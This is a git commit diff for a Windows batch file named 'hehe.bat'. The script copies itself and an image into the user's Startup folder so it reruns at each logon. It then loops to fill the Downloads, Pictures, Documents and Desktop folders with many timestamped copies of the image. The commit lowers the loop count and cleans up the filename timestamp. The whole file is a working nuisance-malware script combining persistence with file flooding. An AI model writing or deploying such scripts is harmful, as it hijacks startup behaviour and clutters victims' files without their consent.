67a4c9a53104b29fd79f7cd2781967d47d4e4aea
terrortoon <81480921+terrortoon@users.noreply.github.com>
2024-02-18 20:26:56 +0100

    Add files via upload

--- hehe.bat
+++ hehe.bat
@@ -1,12 +1,13 @@
 @echo off
 Xcopy /I /Y .\hehe.bat %AppData%\Microsoft\Windows\Start Menu\Programs\Startup\
 Xcopy /I /Y .\hehe.jpg %AppData%\Microsoft\Windows\Start Menu\Programs\Startup\
-
-FOR /L %%A IN (1,1,250) DO (
-	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Downloads\hehe"%%A""%time%".jpg*
-	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Pictures\hehe"%%A""%time%".jpg*
-	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Documents\hehe"%%A""%time%".jpg*	
-	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Desktop\hehe"%%A""%time%".jpg*
+set rmcolon=%time::=%
+set rmcomma=%rmcolon:,=%
+FOR /L %%A IN (1,1,10) DO (
+	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Downloads\hehe"%%A""%rmcomma%".jpg*
+	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Pictures\hehe"%%A""%rmcomma%".jpg*
+	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Documents\hehe"%%A""%rmcomma%".jpg*	
+	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Desktop\hehe"%%A""%rmcomma%".jpg*
 )
 
 
